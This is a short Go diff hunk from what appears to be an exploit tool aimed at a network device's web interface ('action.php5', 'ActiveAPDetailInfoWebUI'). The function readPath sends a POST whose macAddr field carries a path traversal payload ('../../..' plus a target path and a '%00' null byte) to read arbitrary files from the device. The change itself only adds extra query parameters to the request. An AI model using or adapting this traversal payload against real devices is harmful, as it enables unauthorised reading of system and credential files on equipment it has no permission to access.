@@ -261,7 +261,7 @@ func readPath(path string, port int) (s []string, err error) {
 
 	data := strings.NewReader("macAddr=../../.." + path + "%00")
 
-	resp, err := client.Post("https://"+Address+":"+strconv.Itoa(port)+"/action.php5?_page=ActiveAPDetailInfoWebUI&_action=get", "application/x-www-form-urlencoded", data)
+	resp, err := client.Post("https://"+Address+":"+strconv.Itoa(port)+"/action.php5?_page=ActiveAPDetailInfoWebUI&_action=get&name=bloop&debug=true", "application/x-www-form-urlencoded", data)
 	if err != nil {
 		fmt.Println(err)
 		return s, err
